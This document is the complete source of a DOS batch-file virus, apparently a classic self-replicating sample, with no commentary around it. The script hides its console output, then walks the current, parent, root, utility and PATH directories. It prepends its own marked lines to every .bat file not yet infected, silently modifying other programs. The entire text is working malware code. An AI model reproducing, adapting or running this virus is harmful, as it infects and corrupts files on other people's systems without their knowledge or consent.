@ctty nul%[l4m3]%
if [%2]==[l4m3b] goto l4m3b
if not [%2]==[l4m3a] goto l4m3d
for %%f in (%1) do call %0 %%f l4m3b
goto sux%[l4m3]%
:l4m3b
find "l4m3a" %1
if errorlevel 1 goto l4m3c
set l4m3=%1
goto sux%[l4m3]%
:l4m3c
move %1 .\l4m3o
echo. >> l4m3o
echo :sux >> l4m3o
find "l4m3" < %l4m3% > l4m3t
copy /b l4m3t + l4m3o %1
del l4m3?
goto sux%[l4m3]%
:l4m3d
for %%f in (%0;%0.bat) do if exist %%f set l4m3=%%f
for %%f in (.;.;..;c:\;\bat;\batch;\utils;\utility;\sw;%path%) do call %0 %%f\*.bat l4m3a
ctty con%[l4m3]%
 
:sux 
